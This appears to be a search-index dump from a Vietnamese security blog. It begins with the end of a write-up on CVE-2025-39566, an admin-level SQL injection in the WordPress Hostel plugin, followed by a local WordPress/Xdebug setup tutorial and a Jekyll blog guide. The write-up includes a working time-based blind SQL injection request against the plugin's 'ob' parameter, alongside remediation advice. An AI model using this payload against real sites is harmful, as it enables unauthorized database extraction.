/wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nAutomated Extraction Vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông h√≥a qu√° tr√¨nh t·∫•n c√¥ng: Script\nRemediation C·∫≠p nh·∫≠t l√™n Hostel Plugin v1.1.5.7 ho·∫∑c m·ªõi h∆°n\nTakeaways sanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-25-cve-2025-39566/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë \u003ccode\u003eob\u003c/code\u003e trong ph·∫ßn \u003cstrong\u003eManage Bookings\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eForm ƒë·∫∑t ph√≤ng\u003c/li\u003e\n\u003cli\u003eL·ªãch ph√≤ng\u003c/li\u003e\n\u003cli\u003eQu·∫£n l√Ω bookings\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch3 id=\"requirements\"\u003eRequirements\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"code-comparison\"\u003eCode Comparison\u003c/h3\u003e\n\u003cp\u003eS·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/p\u003e","title":"CVE-2025-39566"},{"content":"Introduction WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); ","permalink":"//localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi \u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c 